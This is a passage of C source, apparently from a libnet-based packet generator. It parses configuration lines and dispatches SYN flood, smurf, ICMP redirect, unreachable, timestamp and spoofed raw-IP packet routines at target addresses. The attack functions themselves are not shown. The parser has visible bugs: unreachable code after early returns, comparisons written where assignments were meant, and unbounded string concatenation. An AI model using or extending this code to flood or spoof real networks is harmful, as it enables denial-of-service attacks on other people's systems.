				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			 // printf("%s %s %s %d \n",gen.device,gen.dst_ip,gen.amplifier,gen.count);

			 return 1;
			CountPacket(delay);
			smurf(&gen);
			return 1; //success
		  }
	return 0;

}

int checksynflood(char *l)
{

		//synflood("eth0","161.246.5.24",55,5,2,1);
		Gen gen;
		char burst[10];
		char interval[10];
		
		strcpy(line,l);
		strcpy(check,"");
		strcpy(device,"");
		strcpy(dst_ip,"");
		strcpy(dst_prt,"");
		strcpy(time_x,"");
		strcpy(packet,"");
		strcpy(burst,"");
		strcpy(interval,"");
		

		 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }

		 // printf("-- before check %s \n",check);	

		  if (strcmp(check,"synflood") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_prt,cat);
			  }

				// printf("-- xxxxxxxxxxxxxxxxxxxxxxxn");	
			  for (j=j+1;j<j+500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(burst,cat);
			  }

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(interval,cat);
			  }

			 // printf("%s %s %s \n",packet,burst,interval);

			    //printf("-- xxxxxxxxxxxxxxxxxxxxxxxn");	
			   gen.device = device;
			   gen.dst_ip = dst_ip;
			   gen.dst_prt = atoi(dst_prt);
			   gen.burst = atoi(burst);
			   gen.count = atoi(packet);
			   gen.interval = atoi(interval);

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			  //printf("%s %s %d %d %d %d\n",gen.device,gen.dst_ip,gen.dst_prt,gen.count,gen.burst,gen.interval);
			return 1;
			  CountPacket(delay);
			  synflood(&gen);
			return 1; //success
		  }
	return 0;

}
	
int checkicmp_echo_cq(char *l){
	//int y = icmp_echo_cq("eth0","161.246.5.24","161.246.5.5",20,,payload,size payload); //can't input paylaod

	Gen gen;
	
	strcpy(check,"");
	strcpy(device,"");
	strcpy(src_ip,"");
	strcpy(dst_ip,"");
	strcpy(payload,"");
	strcpy(payload_s,"");
	strcpy(packet,"");

	 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }


	 if (strcmp(check,"icmp_echo_cq") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }
			      for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(payload,cat);
			  }

			 // printf("%s \n",payload);
			      for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(payload_s,cat);
			  }

			 for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.dst_ip = dst_ip;
			   gen.payload = payload;
			   gen.payload_s = (u_short) atoi(payload_s);
			   gen.count = atoi(packet);

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//printf("%s %s %s %s %d %d\n",gen.device,gen.src_ip,gen.dst_ip,gen.payload,gen.payload_s,gen.count);		 
			CountPacket(delay);
			icmp_echo_cq(&gen);
			return 1; //success
		  }

	return 0;

}
int checkicmp_redirect(char *l){
	//int y = icmp_redirect("eth0","161.246.5.24","161.246.5.5","161.246.5.254");
	Gen gen;
	char gw_ip[20];

	strcpy(check,"");
	strcpy(device,"");
	strcpy(src_ip,"");
	strcpy(dst_ip,"");
	strcpy(gw_ip,"");
	strcpy(packet,"");

	 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }


	 if (strcmp(check,"icmp_redirect") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

				// printf("-- xxxxxxxxxxxxxxxxxxxxxxxn");	
			  for (j=j+1;j<j+500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(gw_ip,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.dst_ip = dst_ip;
			   gen.gw_ip = gw_ip;
			   gen.count = atoi(packet);

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//printf("%s %s %s %s %d\n",gen.device,gen.src_ip,gen.dst_ip,gen.gw_ip,gen.count);
			CountPacket(delay);
			icmp_redirect(&gen);
			return 1; //success

		  }
	return 0;

}
int checkicmp_timeexceed(char *l){
	//int y = icmp_timeexceed("eth0","161.246.5.24","161.246.5.5");
	Gen gen;
	

	strcpy(check,"");
	strcpy(device,"");
	strcpy(src_ip,"");
	strcpy(dst_ip,"");
	strcpy(packet,"");

	 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }


	 if (strcmp(check,"icmp_timeexceed") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			 for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.dst_ip = dst_ip;
			   gen.count = atoi(packet);

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//printf("%s %s %s %d\n",gen.device,gen.src_ip,gen.dst_ip,gen.count);
			CountPacket(delay);
			icmp_timeexceed(&gen);
			return 1; //success

		  }
	return 0;

}
int checkicmp_timestamp(char *l){
	//int y = icmp_timestamp("eth0","161.246.5.24","161.246.5.5");
	Gen gen;
	
	strcpy(check,"");
	strcpy(device,"");
	strcpy(src_ip,"");
	strcpy(dst_ip,"");
	strcpy(packet,"");

	 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }


	 if (strcmp(check,"icmp_timestamp") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			 for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.dst_ip = dst_ip;
			   gen.count = atoi(packet);

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//printf("%s %s %s %d\n",gen.device,gen.src_ip,gen.dst_ip,gen.count);		 
			CountPacket(delay);
			icmp_timestamp(&gen);
			return 1; //success
		  }

	return 0;
}
int checkicmp_unreach(char *l){
	//int y = icmp_unreach("eth0","161.246.5.24","161.246.5.5",LIBNET_RAW4,NULL,NULL,50);
	Gen gen;
	char type_link[20];
	//char dst_ip[20];
	//int Type_link=0;
	
	strcpy(check,"");
	strcpy(device,"");
	strcpy(type_link,"");
	strcpy(src_ip,"");
	strcpy(src_mac,"");
	strcpy(dst_ip,"");
	strcpy(dst_mac,"");
	strcpy(packet,"");


	

	 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }


	 if (strcmp(check,"icmp_unreach") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			  //printf("%s \n",dst_ip);

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(type_link,cat);
			  }

			 
		

				  for (j=j+1;j<500;j++)
				  {
					  strcpy(cat,"");
					  if (line[j] == ',') break;
					  sprintf( cat , "%c", line[j]);
					  strcat(src_mac,cat);
				  }
				  
				 
				  
				  	  for (j=j+1;j<500;j++)
				  {
					  strcpy(cat,"");
					  if (line[j] == ',') break;
					  sprintf( cat , "%c", line[j]);
					  strcat(dst_mac,cat);
				  }
			//  

			 for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			if (strcmp(type_link,"LIBNET_RAW4")== 0)
			  {
					// printf("%s \n",type_link);
					gen.type_link = LIBNET_RAW4 ;
			  }


			if (strcmp(type_link,"LIBNET_LINK")== 0)
			{
					 //printf("%s \n",type_link);

				  gen.type_link == LIBNET_LINK;
			}
			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.src_mac = src_mac;
			   gen.dst_ip = dst_ip;
			   gen.dst_mac = dst_mac;
			   gen.count = atoi(packet);

			   //printf("%s \n",gen.dst_ip);

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//printf("%s %s %s %d %s %s %d\n",gen.device,gen.src_ip,gen.dst_ip,gen.type_link,gen.src_mac,gen.dst_mac,gen.count);		 
			CountPacket(delay);
			icmp_unreach(&gen);
			return 1; //success
		  }
	return 0;
}

int checkip(char *l){

	//ip_link("eth0","161.246.5.24","0x010x060x1b0xd50xdd0x7c","161.246.5.5","0xff0xff0xff0xff0xff0xff",LIBNET_LINK,tcp,"XXXX");
	Gen gen;
	char type_link[20];
	char protocol[5];
	//int kuy;
	//char dst_ip[20];
	//int Type_link=0;
	
	strcpy(check,"");
	strcpy(device,"");
	strcpy(type_link,"");
	strcpy(src_ip,"");
	strcpy(src_mac,"");
	strcpy(dst_ip,"");
	strcpy(dst_mac,"");
	strcpy(packet,"");
	strcpy(protocol,"");
	strcpy(payload,"");


	

	 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }


	 if (strcmp(check,"ip") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }

			 for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_mac,cat);
			  }

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			  	  for (j=j+1;j<500;j++)
				  {
					  strcpy(cat,"");
					  if (line[j] == ',') break;
					  sprintf( cat , "%c", line[j]);
					  strcat(dst_mac,cat);
				  }
			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(type_link,cat);
			  }

			 for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(protocol,cat);
			  }

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(payload,cat);
			  }
			 for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			if (strcmp(type_link,"LIBNET_RAW4")== 0)
			  {
					 //printf("%s \n",type_link);
					gen.type_link = LIBNET_RAW4 ;
			  }


			if (strcmp(type_link,"LIBNET_LINK")== 0)
			{
					 //printf("%s \n",type_link);

				  gen.type_link == LIBNET_LINK;
			}
			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.src_mac = src_mac;
			   gen.dst_ip = dst_ip;
			   gen.dst_mac = dst_mac;
			   gen.payload = payload;
			   gen.protocol = protocol;
			   gen.count = atoi(packet);

			  // printf("%s \n",gen.dst_ip);

			    for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }
			//printf("ippppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp\n");
			//printf("delay %d \n",delay);
			//printf("pass\n");
			//kuy = strcmp(type_link,"LIBNET_LINK");
			//printf("kuy %d \n",kuy);
			CountPacket(delay);
			if (strcmp(type_link,"LIBNET_LINK")== 0)
			{
				//printf("kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk \n");
				ip_link(&gen);
			return 1; //success
			} else if ( strcmp(type_link,"LIBNET_RAW4")== 0)
			{
				ip_raw(&gen);          return 1;
			}
		  }
	return 0;
}

